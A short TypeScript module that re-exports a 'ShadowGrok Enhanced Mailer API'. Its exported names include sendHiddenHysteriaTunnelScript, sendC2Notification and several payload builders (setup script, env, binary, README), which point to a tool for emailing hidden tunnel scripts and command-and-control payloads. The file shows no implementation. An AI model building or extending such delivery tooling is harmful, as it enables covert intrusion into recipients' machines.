/**
 * Re-export ShadowGrok Enhanced Mailer API (implementation lives in mailer-service/).
 * Routes import `@/mailer/index` per project conventions.
 */
export {
  sendHiddenHysteriaTunnelScript,
  sendC2Notification,
  createConfigPayload,
  createSetupScriptPayload,
  createEnvPayload,
  createReadmePayload,
  createBinaryPayload,
  PayloadTemplates,
  main as mailerCli,
  type PayloadAttachment,
  type TransportKind,
  type MailInput,
  type SmtpConfig,
  type ApiConfig,
  type SendTunnelScriptOptions,
  type SendNotificationOptions,
} from '../mailer-service/index'
